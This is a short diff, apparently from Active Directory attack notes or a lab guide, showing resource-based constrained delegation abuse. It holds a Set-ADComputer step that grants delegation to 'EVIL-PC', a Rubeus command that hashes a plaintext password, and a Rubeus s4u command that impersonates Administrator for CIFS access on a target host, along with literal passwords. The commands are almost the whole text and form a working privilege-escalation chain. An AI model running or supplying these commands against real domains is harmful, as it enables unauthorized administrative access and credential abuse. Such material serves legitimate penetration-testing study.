@@ -154,8 +154,11 @@ Set-ADComputer -Identity "RBCD-PC" -PrincipalsAllowedToDelegateToAccount "EVIL-P
 # Check
 Get-ADComputer -Identity "RBCD-PC" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
 
+# Convert Password to NTLM Hash
+.\Rubeus.exe hash /password:sako2005! /user:EVIL-PC$ /domain:warzone.oxsium.local
+
 # Full chain with Rubeus
-.\Rubeus.exe s4u /user:EVIL-PC$ /password:Ev1lP@ss123! `
+.\Rubeus.exe s4u /user:EVIL-PC$ /rc4:BURAYA_RC4_HASH `
     /impersonateuser:Administrator `
     /msdsspn:CIFS/RBCD-PC.warzone.oxsium.local `
     /domain:warzone.oxsium.local `
